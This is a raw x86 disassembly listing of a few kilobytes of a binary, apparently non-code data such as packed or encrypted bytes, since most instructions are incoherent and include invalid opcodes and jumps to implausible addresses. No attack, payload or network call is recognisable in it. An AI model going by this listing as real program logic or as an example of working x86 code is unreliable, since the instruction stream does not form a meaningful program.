  418190:	xlat   BYTE PTR ds:[ebx]
  418191:	fmul   QWORD PTR ds:[ecx]
  418194:	loopne 0x418151
  418196:	das    
  418197:	cmp    al,0x2e
  418199:	adc    eax,0x5fedb823
  41819e:	les    esi,FWORD PTR [edi+0x7589dc15]
  4181a4:	fadd   DWORD PTR [eax]
  4181a6:	pop    ebx
  4181a7:	xor    bl,BYTE PTR [edx-0x75]
  4181aa:	and    eax,DWORD PTR [ebx-0x38f4f413]
  4181b0:	jae    0x4181df
  4181b2:	fild   DWORD PTR [eax+0xa4ae77d]
  4181b8:	push   ss
  4181b9:	ret    
  4181ba:	outs   dx,BYTE PTR ds:[esi]
  4181bb:	push   0x12047370
  4181c0:	shl    DWORD PTR [edi+eax*4+0x7b750bd9],cl
  4181c7:	pop    ebx
  4181c8:	div    BYTE PTR [eax+0xdaaf320]
  4181ce:	sbb    DWORD PTR [ebx+0xaf2f07d],eax
  4181d4:	push   edx
  4181d5:	jbe    0x418184
  4181d7:	cmc    
  4181d8:	sbb    BYTE PTR [edx+0x59],ah
  4181db:	cld    
  4181dc:	pop    edx
  4181dd:	jae    0x41822d
  4181df:	popf   
  4181e0:	pop    edx
  4181e1:	xor    DWORD PTR [ecx+0x44dc1bff],ecx
  4181e7:	cmp    al,0x2a
  4181e9:	std    
  4181ea:	cmp    al,0x30
  4181ec:	jb     0x41822b
  4181ee:	cmp    al,0x39
  4181f0:	ja     0x41822b
  4181f2:	imul   ebx,ebx,0x6f74bb14
  4181f8:	icebp  
  4181f9:	sub    al,0x30
  4181fb:	leave  
  4181fc:	rol    BYTE PTR [ecx],0xc3
  4181ff:	xchg   ecx,eax
  418200:	add    esp,esp
  418202:	pop    eax
  418203:	daa    
  418204:	not    BYTE PTR [edx+0x1742e083]
  41820a:	inc    ecx
  41820b:	jg     0x41821f
  41820d:	inc    DWORD PTR [edi]
  41820f:	fimul  WORD PTR [eax]
  418211:	xchg   esi,eax
  418212:	mov    dh,0x7e
  418214:	or     al,0x82
  418216:	ret    
  418217:	and    bl,BYTE PTR [ebx+eax*8]
  41821a:	je     0x418297
  41821c:	inc    ebp
  41821d:	aas    
  41821e:	out    0x84,al
  418220:	leave  
  418221:	ret    
  418222:	and    al,0xdf
  418224:	mov    cl,al
  418226:	mov    ds:0x2cff161d,al
  41822b:	pop    ebx
  41822c:	sub    BYTE PTR [ebp+0x5c],bl
  41822f:	jne    0x41823d
  418231:	lea    esi,[esi+ebx*8]
  418234:	sbb    dh,BYTE PTR [edi+0x4db625f0]
  41823a:	push   esi
  41823b:	adc    DWORD PTR [edx*4-0x11a394a3],esp
  418242:	add    ecx,DWORD PTR [ebp-0x2d]
  418245:	mov    ecx,0x6c27a14d
  41824a:	or     eax,DWORD PTR [ebx]
  41824c:	push   edi
  41824d:	iret   
  41824e:	scas   eax,DWORD PTR es:[edi]
  41824f:	shl    DWORD PTR [edi+edx*4-0x43],cl
  418253:	ins    BYTE PTR es:[edi],dx
  418254:	pop    ss
  418255:	add    ebp,DWORD PTR [eax+0x1b]
  418258:	xchg   ebx,eax
  418259:	jmp    0x6f36:0x48374d4e
  418260:	pop    es
  418261:	mov    eax,0x6a5e4e31
  418266:	add    al,0x2d
  418268:	leave  
  418269:	scas   eax,DWORD PTR es:[edi]
  41826a:	ins    DWORD PTR es:[edi],dx
  41826b:	fsubr  DWORD PTR [ecx]
  41826d:	shl    DWORD PTR [eax-0x50],1
  418270:	std    
  418271:	(bad)  [eax-0x4]
  418274:	rol    DWORD PTR [eax+0x12b7758d],cl
  41827a:	fsubr  st(5),st
  41827c:	sub    BYTE PTR [esp+edi*8],dl
  41827f:	(bad)  
  418280:	icebp  
  418281:	sub    cl,0x44
  418284:	je     0x4b1ad99e
  41828a:	add    BYTE PTR [ecx],dh
  41828c:	jmp    0xb647903e
  418291:	retf   
  418292:	gs in  al,0xa
  418295:	push   ebp
  418296:	clc    
  418297:	imul   ebx
  418299:	mov    bl,0x35
  41829b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41829c:	cmp    DWORD PTR [esi-0x4a],esi
  41829f:	data16 cs aaa 
  4182a2:	adc    BYTE PTR ds:0x1cc1f772,dh
  4182a8:	enter  0x6403,0xf7
  4182ac:	push   esi
  4182ad:	adc    BYTE PTR [eax],bl
  4182af:	cmp    BYTE PTR [edx-0x7f62a441],cl
  4182b5:	stc    
  4182b6:	push   ebx
  4182b7:	jne    0x5b02de9
  4182bd:	int    0xd8
  4182bf:	ret    
  4182c0:	push   cs
  4182c1:	bound  esp,QWORD PTR [esi+0x48]
  4182c4:	jbe    0x4182d5
  4182c6:	jl     0x4182eb
  4182c8:	or     BYTE PTR [ebp+0x754b6a0a],ah
  4182ce:	lock jmp 0x41831b
  4182d1:	mov    al,0x64
  4182d3:	into   
  4182d4:	dec    edx
  4182d5:	call   0x6eee:0xac8e4120
  4182dc:	mov    ch,0xbf
  4182de:	adc    al,cl
  4182e0:	jmp    0x41831f
  4182e2:	mov    esi,0x8bcb3e14
  4182e7:	mov    esi,0x75030674
  4182ec:	cld    
  4182ed:	jbe    0x4182fc
  4182ef:	ja     0x4182b7
  4182f1:	pop    ds
  4182f2:	and    DWORD PTR [edx],edi
  4182f4:	ins    BYTE PTR es:[edi],dx
  4182f5:	aad    0xff
  4182f7:	(bad)  
  4182f8:	xor    dh,BYTE PTR [esi+0x6343b52d]
  4182fe:	mov    DWORD PTR [esi],edi
  418300:	or     edi,DWORD PTR [ebx]
  418302:	add    eax,0x2a85a017
  418307:	push   0x4d3b86b2
  41830c:	out    0x59,eax
  41830e:	imul   edx,ebp,0xffffffdc
  418311:	ja     0x41830f
  418313:	add    eax,0x8ffee957
  418318:	aad    0x95
  41831a:	sbb    al,0x9f
  41831c:	jge    0x418331
  41831e:	jecxz  0x41833c
  418320:	dec    edi
  418321:	mov    ecx,edi
  418323:	in     eax,0xb2
  418325:	xchg   ebp,eax
  418326:	dec    edx
  418327:	jo     0x418376
  418329:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41832a:	push   eax
  41832b:	leave  
  41832c:	(bad)  
  41832d:	cmp    eax,0xbaccc5d1
  418332:	or     dh,dl
  418334:	repz jmp 0x42013b33
  41833a:	ins    BYTE PTR es:[edi],dx
  41833b:	das    
  41833c:	int3   
  41833d:	add    dh,BYTE PTR [edi-0x4a4cc900]
  418343:	inc    edi
  418344:	je     0x418385
  418346:	mov    bl,0x1
  418348:	out    dx,al
  418349:	repnz retf 
  41834b:	outs   dx,DWORD PTR ds:[esi]
  41834c:	push   es
  41834d:	inc    ebp
  41834e:	je     0x418388
  418350:	mov    bl,0x2
  418352:	inc    esi
  418353:	je     0x418367
  418355:	mov    bl,0x3
  418357:	dec    esi
  418358:	je     0x4183d4
  41835a:	outs   dx,DWORD PTR ds:[esi]
  41835b:	jo     0x4183cc
  41835d:	mov    dh,0x4d
  41835f:	mov    dh,BYTE PTR ds:[ebx+0x3b12b804]
  418366:	sub    al,0x39
  418368:	ret    0x2576
  41836b:	sbb    dh,BYTE PTR [ebp+ebx*8+0x1ba5ba81]
  418372:	jne    0x41838f
  418374:	retf   
  418375:	jp     0x4183b9
  418377:	pop    ebx
  418378:	or     DWORD PTR [ebx-0x24233def],0x3d2e00e8
  418382:	cmp    eax,0x12
  418385:	scas   eax,DWORD PTR es:[edi]
  418386:	mov    eax,0x9d50dd0f
  41838b:	mov    al,0xb5
  41838d:	call   0x22a11b02
  418392:	iret   
  418393:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418394:	pop    esi
  418395:	shl    DWORD PTR [ebx-0x13],cl
  418398:	mov    dh,0xcd
  41839a:	sar    DWORD PTR [edi+edx*4-0x3d],0x18
  41839f:	loop   0x4183b3
  4183a1:	add    DWORD PTR gs:[ebx-0x7c],edx
  4183a5:	rcr    BYTE PTR [eax+0x66],cl
  4183a8:	iret   
  4183a9:	lahf   
  4183aa:	xor    esp,eax
  4183ac:	inc    esp
  4183ad:	test   BYTE PTR [edx],bl
  4183af:	or     al,0x73
  4183b1:	mov    ebx,0xeaa716b4
  4183b6:	call   0xf65d20b5
  4183bb:	mov    edx,0xd41c9e06
  4183c0:	jmp    0x41841a
  4183c2:	outs   dx,BYTE PTR ds:[esi]
  4183c3:	or     al,0x3
  4183c5:	or     BYTE PTR [edx-0x31a75c97],dh
  4183cb:	sub    edi,edx
  4183cd:	call   FWORD PTR [edx+0x8]
  4183d0:	sbb    al,0x30
  4183d2:	adc    BYTE PTR [ecx+edi*2+0x717ad981],dh
  4183d9:	loop   0x4183ef
  4183db:	jnp    0x4183a5
  4183dd:	idiv   BYTE PTR [ebp+0x3b]
  4183e0:	mov    ah,BYTE PTR [edi-0x31]
  4183e3:	dec    ebx
  4183e4:	mov    es,WORD PTR [edi+0x43e066d1]
  4183ea:	sub    al,BYTE PTR [edx+0x7deb705]
  4183f0:	add    eax,0x4d5a013e
  4183f5:	clc    
  4183f6:	call   0x33c31091
  4183fb:	inc    ecx
  4183fc:	mov    ebx,0x3df93e25
  418401:	dec    ecx
  418402:	aaa    
  418403:	ins    BYTE PTR es:[edi],dx
  418404:	add    esp,DWORD PTR [esi+0x7d]
  418407:	sub    BYTE PTR [esi],cl
  418409:	ja     0x418403
  41840b:	or     esi,DWORD PTR [edx]
  41840d:	mov    esp,0x85134dc5
  418412:	clc    
  418413:	out    dx,eax
  418414:	push   ecx
  418415:	stos   DWORD PTR es:[edi],eax
  418416:	or     eax,0x7fde0adb
  41841b:	inc    ebx
  41841c:	or     al,0x27
  41841e:	mov    ecx,0x3e75bff7
  418423:	sti    
  418424:	cwde   
  418425:	dec    eax
  418426:	cmp    edi,eax
  418428:	jl     0x418470
  41842a:	jmp    0x41845e
  41842c:	add    ebx,ebx
  41842e:	mov    ch,0xe5
  418430:	sbb    ah,BYTE PTR [eax-0x3f]
  418433:	stos   BYTE PTR es:[edi],al
  418434:	push   es
  418435:	jle    0x418485
  418437:	jmp    0xd93c89ca
  41843c:	push   es
  41843d:	dec    eax
  41843e:	cmp    bh,BYTE PTR [ebp-0x39]
  418441:	das    
  418442:	xlat   BYTE PTR ds:[ebx]
  418443:	inc    esp
  418444:	test   al,0x7b
  418446:	pop    ds
  418447:	jmp    0x418458
  418449:	lea    edx,[ebp-0x5830ef94]
  41844f:	outs   dx,DWORD PTR ds:[esi]
  418450:	stos   BYTE PTR es:[edi],al
  418451:	xchg   BYTE PTR [eax-0x5e],al
  418454:	jnp    0x418487
  418456:	imul   BYTE PTR [edx+0x1a80da08]
  41845c:	adc    BYTE PTR [ebx-0x748bf5a3],bl
  418462:	dec    ebx
  418463:	fld    QWORD PTR [edx-0x8cbf983]
  418469:	fcmove st,st(6)
  41846b:	or     ah,ah
  41846d:	sbb    eax,ebx
  41846f:	aam    0xbf
  418471:	mov    eax,0x92aae088
  418476:	push   eax
  418477:	mov    ebx,esp
  418479:	aaa    
  41847a:	mov    dh,0x48
  41847c:	push   es
  41847d:	aaa    
  41847e:	push   0x883a4dea
  418483:	adc    eax,DWORD PTR [ebx+0x49]
  418486:	xor    al,0xed
  418488:	or     BYTE PTR [edi-0x17],bh
  41848b:	rcr    DWORD PTR [ecx],0xc0
  41848e:	dec    DWORD PTR [ebx-0x76]
  418491:	add    ebp,DWORD PTR [edx-0x78a1cc7]
  418497:	pop    eax
  418498:	pop    esi
  418499:	rcl    esp,cl
  41849b:	in     al,dx
  41849c:	sub    eax,0x9929edc3
  4184a1:	mov    al,ds:0xfba1ca7f
  4184a6:	mov    al,ds:0xc8f2077e
  4184ab:	fwait
  4184ac:	jns    0x4184a8
  4184ae:	mov    eax,ds:0xa0f41778
  4184b3:	jl     0x4184a8
  4184b5:	mov    al,ds:0x517e317d
  4184ba:	cmp    dl,dh
  4184bc:	(bad)  
  4184bd:	mov    esi,0x513b8a2
  4184c2:	retf   
  4184c3:	add    eax,0xb800a943
  4184c8:	xchg   ebx,eax
  4184c9:	test   DWORD PTR [edx],0x1861027d
  4184cf:	jecxz  0x4184ea
  4184d1:	add    DWORD PTR [esi+0x5],edi
  4184d4:	sub    eax,0x6a57aa89
  4184d9:	inc    edi
  4184da:	mov    al,0xa
  4184dc:	daa    
  4184dd:	push   es
  4184de:	adc    BYTE PTR [edx],al
  4184e0:	mov    eax,0x47c6fbee
  4184e5:	test   ecx,edi
  4184e7:	pop    ebx
  4184e8:	popa   
  4184e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4184ea:	jge    0x4184e8
  4184ec:	movzx  ecx,WORD PTR [ebx]
  4184ef:	lea    ebx,[ebp-0x16d29fdf]
  4184f5:	cmp    dh,BYTE PTR [ebx+0x1a]
  4184f8:	sbb    dh,al
  4184fa:	clc    
  4184fb:	hlt    
  4184fc:	ja     0x418515
  4184fe:	pop    edi
  4184ff:	jmp    0x41848e
  418501:	mov    ah,0x49
  418503:	loopne 0x418574
  418505:	adc    esp,ebp
  418507:	mov    ecx,0xb1b1ba4d
  41850c:	inc    eax
  41850d:	xchg   DWORD PTR ds:0x5d42d732,ebp
  418513:	adc    BYTE PTR [eax+0x7f5ddf6d],bh
  418519:	add    DWORD PTR [esp+eax*1+0x4],esi
  41851d:	ja     0x418528
  41851f:	movsx  edi,WORD PTR [eax]
  418522:	cmp    ebx,DWORD PTR [edx+0x7e]
  418525:	add    al,al
  418527:	ins    DWORD PTR es:[edi],dx
  418528:	jl     0x418509
  41852a:	mov    ecx,0xcc9d1c8d
  41852f:	cs pop ebp
  418531:	dec    edi
  418532:	sbb    eax,DWORD PTR [esi+esi*2]
  418535:	sbb    eax,0x78cc503c
  41853a:	cld    
  41853b:	inc    esi
  41853c:	jmp    0xde3b3ea5
  418541:	or     al,0xb2
  418543:	in     eax,dx
  418544:	sbb    dl,BYTE PTR [ebp+0x70]
  418547:	add    ecx,DWORD PTR [esi+esi*8-0x44b9b1b7]
  41854e:	aam    0xc2
  418550:	dec    ebx
  418551:	ror    BYTE PTR [esi-0x54],1
  418554:	or     BYTE PTR [edx],cl
  418556:	add    ecx,DWORD PTR [edx+0x4e]
  418559:	ret    
  41855a:	cdq    
  41855b:	mov    cl,0xb
  41855d:	or     eax,0x38d0d66a
  418562:	stos   BYTE PTR es:[edi],al
  418563:	ret    
  418564:	jle    0x418550
  418566:	das    
  418567:	adc    eax,0xd44d5a6e
  41856c:	xor    al,0x5e
  41856e:	or     al,0x7f
  418570:	sbb    eax,0xdfdf983
  418575:	loop   0x41854d
  418577:	rcl    bl,1
  418579:	sub    eax,0x80aa261a
  41857e:	inc    ebp
  41857f:	je     0x418502
  418581:	test   dl,0x3a
  418584:	mov    bl,BYTE PTR [eax]
  418586:	stos   BYTE PTR es:[edi],al
  418587:	neg    ecx
  418589:	or     eax,0x761aeb5a
  41858e:	jg     0x41856f
  418590:	(bad)  
  418591:	cmc    
  418592:	inc    edx
  418593:	inc    ebp
  418594:	je     0x4185ad
  418596:	stos   BYTE PTR es:[edi],al
  418597:	loop   0x418591
  418599:	pop    es
  41859a:	adc    ecx,DWORD PTR [eax-0x5499df3c]
  4185a0:	push   eax
  4185a1:	pop    es
  4185a2:	outs   dx,DWORD PTR ds:[esi]
  4185a3:	sti    
  4185a4:	or     eax,DWORD PTR [edi]
  4185a6:	and    eax,edi
  4185a8:	daa    
  4185a9:	push   ss
  4185aa:	add    al,0xe1
  4185ac:	(bad)  
  4185ad:	dec    bx
  4185af:	push   edx
  4185b0:	push   ds
  4185b1:	pop    ebx
  4185b2:	add    al,0xe2
  4185b4:	mov    ah,BYTE PTR [ebp+0x23]
  4185b7:	int    0xb1
  4185b9:	mov    esi,DWORD PTR [ebp+0x40]
  4185bc:	dec    ecx
  4185bd:	or     eax,0x9d2bb43b
  4185c2:	imul   edi,DWORD PTR ds:0x4aefb7d,0x7e
  4185c9:	leave  
  4185ca:	mov    al,0x45
  4185cc:	mov    bl,BYTE PTR [ebp-0x15]
  4185cf:	mov    edi,0x2d4ad455
  4185d4:	test   al,0xf8
  4185d6:	push   esi
  4185d7:	mov    eax,ds:0x9da5369a
  4185dc:	adc    dh,BYTE PTR [edx+0x5]
  4185df:	mov    edx,0x77ba6c1e
  4185e4:	push   ecx
  4185e5:	lahf   
  4185e6:	xchg   ebx,eax
  4185e7:	add    eax,0xa5012aeb
  4185ec:	and    eax,0xd757140a
  4185f1:	dec    eax
  4185f2:	dec    eax
  4185f3:	scas   al,BYTE PTR es:[edi]
  4185f4:	mov    dh,0x2f
  4185f6:	xor    ebx,edi
  4185f8:	div    bl
  4185fa:	mov    bl,ah
  4185fc:	inc    ebx
  4185fd:	push   esp
  4185fe:	js     0x41860f
  418600:	dec    ebx
  418601:	jne    0x4185f7
  418603:	(bad)  
  418604:	cli    
  418605:	pop    esp
  418606:	xlat   BYTE PTR ds:[ebx]
  418607:	fimul  DWORD PTR [esi+0x1aaaede2]
  41860d:	jns    0x418597
  41860f:	sbb    al,0x9d
  418611:	(bad)  [ebx+0x74]
  418614:	out    dx,eax
  418615:	(bad)  
  418617:	stos   BYTE PTR es:[edi],al
  418618:	jecxz  0x418623
  41861a:	cmp    al,0x4a
  41861c:	add    BYTE PTR [ecx+0x75],al
  41861f:	stc    
  418620:	adc    DWORD PTR cs:[esi-0x8517c8a],esi
  418627:	ret    
  418628:	dec    edx
  418629:	jns    0x41861e
  41862b:	jno    0x418608
  41862d:	in     eax,0xdb
  41862f:	or     BYTE PTR [eax],dl
  418631:	or     BYTE PTR ds:0x40fb9f2,cl
  418637:	cmp    bl,cl
  418639:	xchg   edi,eax
  41863a:	mov    BYTE PTR [edi-0x345a07ba],ah
  418640:	fimul  WORD PTR [ebp+0x71599b9c]
  418646:	addr16 mov ecx,0xe955ad64
  41864c:	sbb    edi,DWORD PTR [edi]
  41864e:	cmp    al,0x40
  418650:	je     0x418670
  418652:	mov    ds:0xe34eb01,eax
  418657:	pop    ebx
  418658:	pop    es
  418659:	inc    eax
  41865a:	or     cl,BYTE PTR [esp+ecx*1+0x5d6af1d5]
  418661:	fiadd  DWORD PTR ds:0x7c8d6018
  418667:	inc    ebx
  418668:	loop   0x418604
  41866a:	add    eax,0xa835b5b3
  41866f:	test   BYTE PTR [ebp+0x4ac605af],al
  418675:	mov    eax,0x24691bdb
  41867a:	sub    al,BYTE PTR [eax+0x0]
  41867d:	sub    ah,BYTE PTR [esp+eax*1]
  418680:	popf   
  418681:	out    dx,eax
  418682:	not    esi
  418684:	in     al,dx
  418685:	or     ch,BYTE PTR [edx]
  418687:	and    BYTE PTR [eax],ch
  418689:	adc    al,0x29
  41868b:	inc    eax
  41868c:	sub    eax,0x42d2419
  418691:	jge    0x418680
  418693:	cdq    
  418694:	(bad)  [edx]
  418696:	sub    eax,0x28242a13
  41869b:	or     eax,0xebde2404
  4186a0:	(bad)  
  4186a2:	adc    ebp,DWORD PTR ds:0x8372d2d
  4186a8:	sub    eax,0x6dd50440
  4186ad:	mov    edx,0x180732e6
  4186b2:	sub    BYTE PTR [ecx],ch
  4186b4:	sub    BYTE PTR [ecx],bl
  4186b6:	sub    DWORD PTR [edx+0x71],edx
  4186b9:	into   
  4186ba:	cwde   
  4186bb:	inc    eax
  4186bc:	shl    eax,cl
  4186be:	mov    esp,0x88058cda
  4186c3:	mov    al,ds:0x6aa7a700
  4186c8:	in     al,dx
  4186c9:	jmp    0x4186b9
  4186cb:	popf   
  4186cc:	arpl   WORD PTR [edi],cx
  4186ce:	jmp    0xedf069d7
  4186d3:	or     DWORD PTR [esi-0x4a],esp
  4186d6:	mov    DWORD PTR [edx],0x25747385
  4186dc:	mov    dl,dl
  4186de:	cmp    eax,0xffc02c45
  4186e3:	push   es
  4186e4:	jne    0x418708
  4186e6:	test   WORD PTR [esi+0x6],0x11d1
  4186ec:	fdivr  QWORD PTR [eax]
  4186ee:	add    bl,ah
  4186f0:	adc    cl,BYTE PTR [ecx]
  4186f2:	cmp    DWORD PTR [esi-0x21],0xc6194003
  4186f9:	inc    ebx
  4186fa:	mov    esi,0x232bbc6c
  4186ff:	xor    eax,0x2edbf062
  418704:	mov    edx,0x10c0693f
  418709:	dec    ebp
  41870a:	sbb    al,0x1c
  41870c:	adc    al,0xdf
  41870e:	add    eax,0x4010f8c1
  418713:	hlt    
  418714:	mov    eax,ds:0x4dd67f1d
  418719:	neg    ecx
  41871b:	loope  0x418770
  41871d:	fstp   QWORD PTR [eax+ecx*8]
  418720:	pop    ebx
  418721:	frndint 
  418723:	jmp    0x7fb11303
  418728:	shr    DWORD PTR [edi-0x26277bc4],cl
  41872e:	fstsw  WORD PTR [ebp-0xa]
  418732:	fwait
  418733:	pop    ebx
  418734:	inc    ebp
  418735:	test   BYTE PTR [eax],0x41
  418738:	sub    edi,DWORD PTR [ebx-0x258b0901]
  41873e:	mov    bh,0x99
  418740:	jmp    FWORD PTR [esi]
  418742:	fbstp  TBYTE PTR [ebp-0x18]
  418745:	lea    edi,[ebx+0x3]
  418748:	mov    edx,0x8a9b3c09
  41874d:	jecxz  0x41870e
  41874f:	inc    ecx
  418750:	jecxz  0x418796
  418752:	sub    ah,bh
  418754:	dec    eax
  418755:	loope  0x41875b
  418757:	and    ah,0xf
  41875a:	add    ax,0x3030
  41875e:	sub    edi,eax
  418760:	fld    TBYTE PTR [ebp-0x3fb962be]
  418766:	stos   BYTE PTR es:[edi],al
  418767:	inc    esp
  418768:	clc    
  418769:	add    edi,DWORD PTR [ebp+0x8]
  41876c:	jns    0x418775
  41876e:	cld    
  41876f:	data16 cli 
  418771:	xlat   BYTE PTR ds:[ebx]
  418772:	dec    ebp
  418773:	jge    0x41878d
  418775:	cmp    edi,DWORD PTR [ebp+0xc]
  418778:	dec    esi
  418779:	add    al,0x83
  41877b:	call   DWORD PTR [edx]
  41877d:	jae    0x4187a6
  41877f:	jle    0x4187ec
  418781:	icebp  
  418782:	dec    ebx
  418783:	lea    edi,[ebx]
  418785:	add    esi,DWORD PTR ds:0x6fa2572
  41878b:	add    BYTE PTR [edi+0x78],cl
  41878e:	or     eax,0x897edbfe
  418793:	out    0x7,eax
  418795:	adc    cl,bh
  418797:	in     eax,dx
  418798:	jmp    0x4187b9
  41879a:	data16 (bad) 
  41879c:	mov    al,0x31
  41879e:	div    BYTE PTR fs:[edi]
  4187a1:	fdivr  st,st(3)
  4187a3:	jmp    0x4187b9
  4187a5:	mov    edi,0x2019249d
  4187aa:	xor    BYTE PTR [ecx+esi*8-0x5],dh
  4187ae:	jp     0x41881b
  4187b0:	mov    ebx,0x880856eb
  4187b5:	shr    dx,0x6d
  4187b9:	mov    DWORD PTR [ebx+edx*2],esi
  4187bc:	add    al,bl
  4187be:	xchg   DWORD PTR [ebx],eax
  4187c0:	ds call 0x652f7610
  4187c6:	pop    ds
  4187c7:	pop    gs
  4187c9:	les    esp,FWORD PTR [ebx-0x5ed8ef9e]
  4187cf:	rcr    DWORD PTR [edi+0x706d535a],0x9
  4187d6:	sar    edi,1
  4187d8:	mov    bh,0x83
  4187da:	rol    BYTE PTR [edi-0x482fa522],cl
  4187e0:	addr16 neg eax
  4187e3:	sbb    edx,0x3c
  4187e6:	test   BYTE PTR [eax],cl
  4187e8:	or     edi,edi
  4187ea:	jge    0x4187e4
  4187ec:	out    0x88,al
  4187ee:	scas   al,BYTE PTR es:[edi]
  4187ef:	mov    al,BYTE PTR [esp+edi*2]
  4187f2:	pop    ds
  4187f3:	mov    edi,0xe12d4129
  4187f8:	mov    ebp,?
  4187fa:	fistp  QWORD PTR [esi]
  4187fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4187fd:	sbb    edx,0xde0b6b3
  418803:	jae    0x4187f7
  418805:	dec    ecx
  418806:	add    eax,0x123d20d
  41880b:	ficomp DWORD PTR [esi+0x60]
  41880e:	loopne 0x418877
  418810:	in     al,0xdf
  418812:	ins    DWORD PTR es:[edi],dx
  418813:	add    eax,0xdf0a82fa
  418818:	rcl    cl,1
  41881a:	or     bl,BYTE PTR gs:[esi]
  41881d:	fidiv  DWORD PTR [edi+eax*4-0x3cf58d01]
  418824:	push   es
  418825:	lea    edx,[ebx]
  418827:	pop    es
  418828:	ficom  WORD PTR [ebp-0x47]
  41882c:	or     al,0xfd
  41882e:	(bad)  
  41882f:	xchg   ebx,eax
  418830:	test   DWORD PTR [ebx],ecx
  418832:	sub    DWORD PTR [ebp+0x1e],esi
  418835:	into   
  418836:	and    al,0xf
  418838:	jne    0x418859
  41883a:	dec    ecx
  41883b:	mov    bh,0xb0
  41883d:	(bad)  
  41883e:	outs   dx,DWORD PTR ds:[esi]
  41883f:	adc    al,0xeb
  418841:	cmp    DWORD PTR [eax+0x1fbe04c8],ecx
  418847:	adc    ch,dh
  418849:	lods   eax,DWORD PTR ds:[esi]
  41884a:	int    0x3d
  41884c:	and    BYTE PTR [esi],al
  41884e:	and    edx,ebp
  418850:	add    BYTE PTR [ebp+0x3703134c],cl
  418856:	mov    bh,0xdd
  418858:	cs push edi
  41885a:	mov    BYTE PTR [edi],0xe7
  41885d:	cmp    BYTE PTR [edi],0xe3
  418860:	idiv   DWORD PTR [ebx+0xaeb1fde]
  418866:	push   esi
  418867:	fmul   DWORD PTR [edx+edi*1]
  41886a:	fisttp DWORD PTR [eax+0x6752e70d]
  418870:	cmc    
  418871:	loope  0x418895
  418873:	sub    al,0x8
  418875:	pop    ds
  418876:	hlt    
  418877:	pop    ebp
  418878:	sbb    BYTE PTR [edx],al
  41887a:	ror    DWORD PTR [eax],0x2b
  41887d:	pop    es
  41887e:	ins    BYTE PTR es:[edi],dx
  41887f:	clc    
  418880:	or     esi,DWORD PTR [edi+0x78d99b17]
  418886:	fclex  
  418889:	fldcw  WORD PTR ds:0xeed9ab4c
  41888f:	inc    edx
  418890:	lods   eax,DWORD PTR ds:[esi]
  418891:	icebp  
  418892:	aaa    
  418893:	shl    DWORD PTR [ebx+eiz*4-0x76],cl
  418897:	ds cmp bh,0x2b
  41889b:	(bad)  
  41889c:	add    al,0x7c
  41889e:	pop    ebp
  41889f:	ror    BYTE PTR [edi-0x2fb9fe18],1
  4188a5:	fs scas al,BYTE PTR es:[edi]
  4188a7:	ss cmp bl,dl
  4188aa:	pop    ss
  4188ab:	bound  ebp,QWORD PTR [edi+0x30]
  4188ae:	jne    0x4188b8
  4188b0:	inc    esi
  4188b1:	push   cs
  4188b2:	push   ds
  4188b3:	cmp    ecx,esi
  4188b5:	je     0x418906
  4188b7:	adc    bh,ch
  4188b9:	mov    ebx,0x3c1685d0
  4188be:	inc    ebp
  4188bf:	mov    eax,ds:0xca145246
  4188c4:	pop    eax
  4188c5:	add    edx,eax
  4188c7:	mov    ecx,0x3f8aed4a
  4188cc:	dec    esp
  4188cd:	jne    0x418902
  4188cf:	mov    ds:0x85196cf,eax
  4188d4:	push   0x4b2bf082
  4188d9:	mov    esp,0x251fed1
  4188de:	fchs   
  4188e0:	sbb    BYTE PTR [eax-0x63c020fc],cl
  4188e6:	fistp  DWORD PTR [edx+ebp*4-0x23]
  4188ea:	cmp    BYTE PTR [edi],0xa
  4188ed:	test   ax,0x7aeb
  4188f1:	mov    al,0x1
  4188f3:	outs   dx,BYTE PTR ds:[esi]
  4188f4:	pop    edi
  4188f5:	xor    edx,DWORD PTR [ecx]
  4188f7:	and    al,dl
  4188f9:	mov    ebp,DWORD PTR [ebp-0x6f]
  4188fc:	jmp    0x418954
  4188fe:	jmp    FWORD PTR [ebx-0x4b]
  418901:	mov    edi,0x203c0466
  418906:	faddp  st(2),st
  418908:	fsubr  DWORD PTR [esp+ebp*1+0x730a043a]
  41890f:	not    dh
  418911:	shl    bl,0xf
  418914:	fimul  DWORD PTR ds:0x2dab153
  41891a:	inc    edx
  41891b:	jmp    0x418907
  41891d:	sbb    edx,esi
  41891f:	into   
  418920:	xlat   BYTE PTR ds:[ebx]
  418921:	js     0x4188ad
  418923:	push   cs
  418924:	sti    
  418925:	scas   eax,DWORD PTR es:[edi]
  418926:	stc    
  418927:	xchg   ebx,eax
  418928:	sub    DWORD PTR [esi+0xe3f6f5d],edi
  41892e:	inc    esi
  41892f:	imul   edx,edx,0xa
  418932:	pop    DWORD PTR [ecx+0x72c8f4fa]
  418938:	jmp    0xd082:0x8cc0021b
  41893f:	mov    ah,0x15
  418941:	mul    DWORD PTR [eax]
  418943:	mov    dh,0x8
  418945:	inc    ebx
  418946:	pop    ecx
  418947:	xor    DWORD PTR [edi],ecx
  418949:	pushf  
  41894a:	pop    edx
  41894b:	mov    al,ds:0xb681d9d5
  418950:	ror    BYTE PTR [edx+0x7],0xa7
  418954:	mov    dh,0x4d
  418956:	ret    0xc88b
  418959:	push   cs
  41895a:	shl    BYTE PTR [ecx],0x8b
  41895d:	inc    ebx
  41895e:	es pop ebx
  418960:	push   edx
  418961:	pop    ebx
  418962:	outs   dx,DWORD PTR ds:[esi]
  418963:	das    
  418964:	add    BYTE PTR [edx+0x14],dl
  418967:	push   ss
  418968:	enter  0x1b1,0x72
  41896c:	pop    ds
  41896d:	mov    cl,0x52
  41896f:	xor    esp,DWORD PTR [eax+0x58]
  418972:	ret    
  418973:	pop    ecx
  418974:	pusha  
  418975:	xchg   BYTE PTR [eax-0x3c],ah
  418978:	arpl   sp,bp
  41897a:	fwait
  41897b:	mov    ds,WORD PTR [esi]
  41897d:	std    
  41897e:	or     BYTE PTR es:[edx-0x2c],dh
  418982:	scas   eax,DWORD PTR es:[edi]
  418983:	fld    TBYTE PTR [esp]
  418986:	fstp   QWORD PTR [esi]
  418988:	fwait
  418989:	adc    dh,BYTE PTR [edx+0x1]
  41898c:	mov    dh,0x20
  41898e:	or     al,0x2b
  418990:	fxam   
  418992:	add    dh,BYTE PTR [edx-0x3e]
  418995:	jae    0x418948
  418997:	add    DWORD PTR [edi+0x568d835b],edi
